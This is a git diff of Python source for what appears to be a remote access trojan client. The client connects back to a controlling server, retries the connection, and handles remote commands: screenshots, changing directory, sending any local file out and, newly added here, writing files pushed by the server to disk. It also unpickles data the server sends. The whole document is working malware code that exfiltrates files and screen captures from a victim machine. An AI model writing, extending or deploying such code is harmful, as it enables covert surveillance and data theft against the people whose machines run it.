@@ -9,7 +9,7 @@ from getpass import getuser
 from datetime import datetime
 from pyscreenshot import grab
 from pathlib import Path
-from pickle import dumps
+from pickle import loads, dumps
 from subprocess import getoutput
 from requests import get, packages
 from os import uname, chdir, getcwd
@@ -30,6 +30,15 @@ class Client(object):
     def removeScreenshot(self):
         Path(self.screenshotPath).unlink(missing_ok=True)
 
+    def upload(self, args):
+        header = loads(self.__Client.recv(512))
+        try:
+            self.receiveFile(header)
+            self.sendHeader({"content": f"File {Path(args).stem} uploaded successfully!", "sucess": True})
+
+        except Exception as err:
+            self.sendHeader({"content": err, "sucess": False})
+
     def screenshot(self, args):
         grab().save(self.screenshotPath)
         namefile, extension, file = self.splitFile(self.screenshotPath)
@@ -46,12 +55,43 @@ class Client(object):
         sleep(1)
         self.__Client.send(file)
 
+    def download(self, args):
+        try:
+            if Path(args).is_file():
+                namefile, extension, file = self.splitFile(args)
+                header = {
+                    "namefile": namefile,
+                    "extension": extension,
+                    "bytes": len(file),
+                    "path": "files",
+                    "sucess": True
+                }
+
+                self.sendHeader(header)
+                sleep(1)
+                self.__Client.send(file)
+
+            else:
+                self.sendHeader({"content": f"File {Path(args).stem} not found", "sucess": False})
+
+        except Exception as err:
+            self.sendHeader({"content": err, "sucess": False})
+
+    def saveReceivedFile(self, path, content):
+        with open(path, 'wb') as receivedFile:
+            receivedFile.write(content)
+
+    def receiveFile(self, header):
+        file = b''
+
+        while len(file) < header['bytes']:
+            file += self.__Client.recv(header['bytes'])
+
+        self.saveReceivedFile(f'{header["namefile"]}{header["extension"]}', file)
+
     def splitFile(self, path):
         with open(path, 'rb') as file:
             return Path(path).stem, Path(path).suffix, file.read()
-
-    def sendFile(self, file):
-        self.__Client.send(file)
 
     def sendHeader(self, header):
         self.__Client.send(dumps(header))
@@ -66,28 +106,11 @@ class Client(object):
         except FileNotFoundError:
             self.sendCommand(self.lastCommand)
 
-    def download(self, arg):
-        if Path(arg).is_file():
-            namefile, extension, file = self.splitFile(arg)
-            header = {
-                "namefile": namefile,
-                "extension": extension,
-                "bytes": len(file),
-                "path": "files",
-                "exists": True
-            }
-
-            self.sendHeader(header)
-            sleep(1)
-            self.sendFile(file)
-
-        else:
-            self.sendHeader({"namefile":arg, "exists": False})
-
     def allCommands(self):
         return {
             "/screenshot": {"action": self.screenshot},
             "/download": {"action": self.download},
+            "/upload": {"action": self.upload},
             "cd": {"action":  self.changeDirectory}
         }
 
@@ -147,7 +170,7 @@ class Client(object):
             self.__Client.send(self.identifier())
             
         except ConnectionRefusedError:
-            sleep(1);self.connect()
+            sleep(5);self.connect()
 
     def configureSocket(self):
         self.__Client = socket(AF_INET, SOCK_STREAM)
